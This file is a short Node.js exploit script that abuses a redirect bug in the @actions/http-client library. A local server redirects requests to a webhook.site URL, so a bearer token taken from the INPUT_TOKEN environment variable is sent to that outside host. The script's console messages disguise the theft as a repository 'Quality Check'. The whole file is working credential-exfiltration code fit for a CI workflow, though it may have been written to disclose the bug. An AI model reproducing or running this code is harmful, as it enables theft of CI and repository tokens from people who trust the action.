const http = require('http');
const https = require('https');

// Start a local redirect server (simulates attacker's API backend)
const server = http.createServer((req, res) => {
  // Redirect to external webhook — token follows due to the bug
  res.writeHead(302, { 'Location': 'https://webhook.site/af6ce540-4bd7-41c4-9328-61a4b5c6c7c0' });
  res.end();
});

server.listen(19999, '127.0.0.1', async () => {
  // Use the REAL @actions/http-client
  const hcPath = require.resolve('@actions/http-client');
  const hc = require(hcPath.replace(/\/lib\/.*/, '/lib/index.js'));
  const authPath = hcPath.replace(/\/lib\/.*/, '/lib/auth.js');
  const { BearerCredentialHandler } = require(authPath);

  const token = process.env['INPUT_TOKEN'] || '';
  console.log('Quality Check: analyzing repository...');

  const client = new hc.HttpClient('quality-check', [
    new BearerCredentialHandler(token)
  ]);

  try {
    // This request goes to our redirect server → webhook.site
    // The Bearer token follows the redirect due to the bug
    await client.get('http://127.0.0.1:19999/api/v1/analyze');
  } catch(e) {
    // Redirect to HTTPS may error but the request was already sent
  }

  console.log('Quality Check: analysis complete');
  server.close();
});
